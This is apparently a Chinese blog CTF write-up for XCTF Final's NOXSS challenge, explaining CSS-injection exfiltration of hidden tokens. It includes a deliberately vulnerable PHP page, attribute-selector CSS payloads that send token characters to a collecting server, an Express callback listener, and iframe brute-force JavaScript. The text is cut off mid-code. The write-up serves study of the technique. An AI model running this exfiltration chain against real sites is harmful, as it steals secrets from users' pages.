href="/about">About</a> <a class="navbar-item" href="/advertisement">Ads</a></div><div class="navbar-menu navbar-end"> <a class="navbar-item search" title="Search" href="javascript:;"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-sousuo"></use></svg></a><div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc"> <a class="navbar-item" title="Table of Contents"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-list"></use></svg></a><div class="navbar-dropdown is-right"> <a class="navbar-item" href="#Preparation">1&nbsp;&nbsp;<b>Preparation</b></a> <a class="navbar-item" href="#INTRO">1.1&nbsp;&nbsp;INTRO</a> <a class="navbar-item" href="#Token1-Get-From-Input">1.1.1&nbsp;&nbsp;Token1 - Get From Input</a> <a class="navbar-item" href="#Token1-Auto-Get-From-Input">1.1.2&nbsp;&nbsp;Token1 - Auto Get From Input</a> <a class="navbar-item" href="#Token1-Same-Origin">1.1.3&nbsp;&nbsp;Token1 - Same Origin</a> <a class="navbar-item" href="#Token2-Font">1.1.4&nbsp;&nbsp;Token2 - Font</a> <a class="navbar-item" href="#Token2-Get-From-JavaScript">1.1.5&nbsp;&nbsp;Token2 - Get From JavaScript</a><hr class="navbar-divider"> <a class="navbar-item" href="#NOXSS">2&nbsp;&nbsp;<b>NOXSS</b></a><hr class="navbar-divider"> <a class="navbar-item" href="#Reference">3&nbsp;&nbsp;<b>Reference</b></a></div></div> <a class="navbar-item" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-github"></use></svg></a> <a class="navbar-item" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-twitter"></use></svg></a> <a class="navbar-item" title="RSS" href="https://blog.zeddyu.info/atom.xml"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-rss"></use></svg></a></div></div></nav><section class="section"><div class="container"><article class="article content gallery" itemscope itemprop="blogPost"><h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name"> XCTF Final NOXSS Write Up</h1><div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile"> <span class="column is-narrow"><span>Nov 21 2019</span> <span class="second-date-block">(<time datetime="2019-11-21T00:37:14.000Z" itemprop="datePublished">Nov 21 2019</time>)</span></span> <span class="column is-narrow article-category"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-folder"></use></svg><a class="article-category-link" href="/categories/CTF/">CTF</a></span> <span class="column is-narrow"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-shalou"></use></svg> <span class="article-category-link">37 minutes read (About 5517 words)</span></span></div><div class="article-entry is-size-6-mobile" itemprop="articleBody"><ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Preparation"><span class="post-toc-number">1.</span> <span class="post-toc-text">Preparation</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#INTRO"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">INTRO</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Token1-Get-From-Input"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">Token1 - Get From Input</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Token1-Auto-Get-From-Input"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">Token1 - Auto Get From Input</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Token1-Same-Origin"><span class="post-toc-number">1.1.3.</span> <span class="post-toc-text">Token1 - Same Origin</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Token2-Font"><span class="post-toc-number">1.1.4.</span> <span class="post-toc-text">Token2 - Font</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Token2-Get-From-JavaScript"><span class="post-toc-number">1.1.5.</span> <span class="post-toc-text">Token2 - Get From JavaScript</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#NOXSS"><span class="post-toc-number">2.</span> <span class="post-toc-text">NOXSS</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Reference"><span class="post-toc-number">3.</span> <span class="post-toc-text">Reference</span></a></li></ol><html><head></head><body><p>这是本次比赛做起来最有跪感的一题了，当时比赛的时候怎么都弄不出来…赛后问了一下，主要还是差了一篇文章 <a href="https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/" target="_blank" rel="noopener">Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację</a>，这个标题是个波兰语，中文翻译过来就是使用 CSS 攻击 Web 应用程序，从文章内容也看到了 RPO 的攻击引述，也正是之前 noxss 2017 的解法。</p><blockquote class="colorquote success"><p>文章首发于先知社区：<a href="https://xz.aliyun.com/t/6812" target="_blank" rel="noopener">https://xz.aliyun.com/t/6812</a></p></blockquote><a id="more"></a><p>[TOC]</p><h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><p><strong>所做的实验测试均在 Chrome 78.0.3904.97 版本上</strong>，Firefox 有一些场景未测试成功。</p><p>我们需要的有 fontforge / nodejs / npm|yarn ，安装 <a href="http://designwithfontforge.com/en-US/Installing_Fontforge.html" target="_blank" rel="noopener">fontforge on ubuntu</a>，安装 <a href="https://stackoverflow.com/questions/41195952/updating-nodejs-on-ubuntu-16-04" target="_blank" rel="noopener">nodejs on ubuntu</a></p><h2 id="INTRO"><a href="#INTRO" class="headerlink" title="INTRO"></a>INTRO</h2><p>在我们看题之前，我们先来看看一些简化的情况</p><p>首先创建一个 css.php ，内容如下：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="hljs-string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="hljs-string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="hljs-string">"viewport"</span> content=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="hljs-string">"X-UA-Compatible"</span> content=<span class="hljs-string">"ie=edge"</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$token1 = md5($_SERVER[<span class="hljs-string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">$token2 = md5($token1);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;input type=hidden value=<span class="hljs-meta">&lt;?</span>=$token1 <span class="hljs-meta">?&gt;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">true<span class="hljs-keyword">var</span> TOKEN = <span class="hljs-string">"&lt;?=$token2 ?&gt;"</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">true<span class="hljs-meta">&lt;?</span>=preg_replace(<span class="hljs-string">'#&lt;/style#i'</span>, <span class="hljs-string">'#'</span>, $_GET[<span class="hljs-string">'css'</span>]) <span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>这段代码也比较简单，input 标签与 script 标签内均有一个 token ，我们需要使用传入 css 参数来获取这两个 token</p><h3 id="Token1-Get-From-Input"><a href="#Token1-Get-From-Input" class="headerlink" title="Token1 - Get From Input"></a>Token1 - Get From Input</h3><p>首先我们来尝试去获取第一个 token1 ，也就是在 input 标签内的 value 属性值，我们可控的只有 css 参数，所以我们只能去尝试构造 css 来获取 input 标签内的 value 属性值。</p><p>在 css 当中我们可以使用 css 选择器来选择我们的标签元素，例如</p><p></p><figure class="highlight css hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* 设置 body 标签元素 */</span></span><br><span class="line"><span class="hljs-selector-tag">body</span> { }</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">/* 设置 .test class 的样式 */</span></span><br><span class="line"><span class="hljs-selector-class">.test</span> { }</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">/* 设置 id 为 test2 的样式 */</span></span><br><span class="line"><span class="hljs-selector-id">#test2</span> { }</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">/* 设置 value 为 abc 的 input 标签的样式 */</span></span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value=<span class="hljs-string">"abc"</span>]</span> { }</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">/* 设置 value 为 a 开头的 input 标签的样式 */</span></span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">"a"</span>]</span> { }</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以看到在 css 选择器当中，我们可以设置类似<code>value^="a"</code>这样的选择器来获取我们的元素，所以这里我们大概可以有这么一个操作:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">hidden</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"7b8a45b8297cf82cc3cefc174c3ae5a1"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-css">        <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">"0"</span>]</span> {</span></span><br><span class="line">            background: url(http://127.0.0.1:9999/0);</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-css">        <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">"7"</span>]</span> {</span></span><br><span class="line">            background: url(http://127.0.0.1:9999/7);</span><br><span class="line">        }</span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119004834.png" alt=""></p><p>可以看到我们这里收到了<code>value^="7"</code>选择器发来的请求，所以我们也可以i使用枚举思想来进行爆破获取 token1</p><h3 id="Token1-Auto-Get-From-Input"><a href="#Token1-Auto-Get-From-Input" class="headerlink" title="Token1 - Auto Get From Input"></a>Token1 - Auto Get From Input</h3><p>剩下的就是要思考我们要如何去构造自动化工具去获取这个 token1 了，这里自动化的难点就在于如何获取爆破的时候是哪个字符正确了而发起了请求，无法拿到这个 callback 我们也就没有依据判断究竟是哪个字符注入正确了而发起了请求。</p><p>原文是采取了使用 cookie 的方式来进行这个 callback 的过程：</p><ul><li>在服务器上放置一个有 iframe 页面 index.html ，src 为要注入的页面 css</li><li>建立一个服务供接受注入字符发来的请求，并且服务通过设置一个 cookie 来响应这个请求</li><li>index.html 根据 cookie 来进行判断注入的字符是否正确，正确的话就使用变量进行存储然后接着下一位的爆破</li></ul><p>我们在服务端就需要提供这么些功能，所以我们可以构造这么个服务，用<code>npm install</code>或者<code>yarn</code>以下面这个 package.json 构建</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="hljs-attr">"name"</span>: <span class="hljs-string">"css-attack-1"</span>,</span><br><span class="line">  <span class="hljs-attr">"version"</span>: <span class="hljs-string">"1.0.0"</span>,</span><br><span class="line">  <span class="hljs-attr">"description"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">  <span class="hljs-attr">"main"</span>: <span class="hljs-string">"index.js"</span>,</span><br><span class="line">  <span class="hljs-attr">"dependencies"</span>: {</span><br><span class="line">    <span class="hljs-attr">"express"</span>: <span class="hljs-string">"^4.15.5"</span>,</span><br><span class="line">    <span class="hljs-attr">"js-cookie"</span>: <span class="hljs-string">"^2.1.4"</span></span><br><span class="line">  },</span><br><span class="line">  <span class="hljs-attr">"devDependencies"</span>: {},</span><br><span class="line">  <span class="hljs-attr">"author"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">  <span class="hljs-attr">"license"</span>: <span class="hljs-string">"ISC"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>以及相应的服务代码：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.disable(<span class="hljs-string">'etag'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">const</span> PORT = <span class="hljs-number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">'/token/:token'</span>,(req,res) =&gt; {</span><br><span class="line">    <span class="hljs-keyword">const</span> { token } = req.params; <span class="hljs-comment">//var {a} = {a:1, b:2}; =&gt; var obj = {a:1, b:2};var a = obj.a;</span></span><br><span class="line">        <span class="hljs-built_in">console</span>.log(token);</span><br><span class="line">    res.cookie(<span class="hljs-string">'token'</span>,token);</span><br><span class="line">    res.send(<span class="hljs-string">''</span>)</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">'/cookie.js'</span>,(req,res) =&gt; {</span><br><span class="line">    res.sendFile(<span class="hljs-string">'js.cookie.js'</span>,{</span><br><span class="line">        root: <span class="hljs-string">'./node_modules/js-cookie/src/'</span></span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">'/index.html'</span>,(req,res) =&gt; {</span><br><span class="line">    res.sendFile(<span class="hljs-string">'index.html'</span>,{</span><br><span class="line">        root: <span class="hljs-string">'.'</span></span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.listen(PORT, () =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Listening on <span class="hljs-subst">${PORT}</span>...`</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后使用<code>node index.js</code>跑起来就行了。</p><p>整个流程大致是如下一个流程：</p><ol><li>如果我们目前提取的 token 长度小于预期的长度，则我们执行以下操作</li><li>删除包含所有先前提取数据的 cookie</li><li>创建一个 iframe 标签，并 src 指向我们构造好的字符爆破的页面。</li><li>我们一直等到自己的服务 callback 为爆破请求设置含有 token 的 cookie</li><li>设置 cookie 后，我们将其设置为当前的已知 token 值，并返回到步骤1</li></ol><p>所以我们可以有大致以下框架：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">big</span> <span class="hljs-attr">id</span>=<span class="hljs-string">token</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">big</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">iframe</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  (<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-keyword">const</span> EXPECTED_TOKEN_LENGTH = <span class="hljs-number">32</span>;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> ALPHABET = <span class="hljs-built_in">Array</span>.from(<span class="hljs-string">"0123456789abcdef"</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> iframe = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'iframe'</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> extractedToken = <span class="hljs-string">''</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-keyword">while</span> (extractedToken.length &lt; EXPECTED_TOKEN_LENGTH) {</span></span><br><span class="line">      clearTokenCookie();</span><br><span class="line">      createIframeWithCss();</span><br><span class="line"><span class="hljs-javascript">      extractedToken = <span class="hljs-keyword">await</span> getTokenFromCookie();</span></span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'token'</span>).textContent = extractedToken;</span></span><br><span class="line">    }</span><br><span class="line">  })();</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>首先我们可以直接使用 <a href="https://github.com/js-cookie/js-cookie" target="_blank" rel="noopener">js-cookie</a> 这个项目来直接清除 cookie</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearTokenCookie</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">    Cookies.remove(<span class="hljs-string">'token'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>接下来，我们需要为 <code>iframe</code> 标签构造注入的页面 URL :</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createIframeWithCss</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  iframe.src = <span class="hljs-string">'http://127.0.0.1/css.php?css='</span> + <span class="hljs-built_in">encodeURIComponent</span>(generateCSS());</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>以及生成 css 的函数：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateCSS</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">let</span> css = <span class="hljs-string">''</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> char <span class="hljs-keyword">of</span> ALPHABET) {</span><br><span class="line">    css += <span class="hljs-string">`input[value^="<span class="hljs-subst">${extractedToken}</span><span class="hljs-subst">${char}</span>"] {</span></span><br><span class="line"><span class="hljs-string">background: url(http://127.0.0.1:3000/token/<span class="hljs-subst">${extractedToken}</span><span class="hljs-subst">${char}</span>)</span></span><br><span class="line"><span class="hljs-string">}`</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> css;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>最后我们需要实现通过等待反向连接来设置 cookie ，用 JS 中的 <code>Promise</code> 机制来构建异步函数，每隔50毫秒检查一次 cookie 是否已设置，如果已设置，该函数将立即返回该值。</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTokenFromCookie</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">const</span> interval = setInterval(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">            <span class="hljs-keyword">const</span> token = Cookies.get(<span class="hljs-string">'token'</span>);</span><br><span class="line">            <span class="hljs-keyword">if</span> (token) {</span><br><span class="line">                clearInterval(interval);</span><br><span class="line">                resolve(token);</span><br><span class="line">            }</span><br><span class="line">        }, <span class="hljs-number">50</span>);</span><br><span class="line">    });</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>最后整合起来的攻击方式是这样的：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 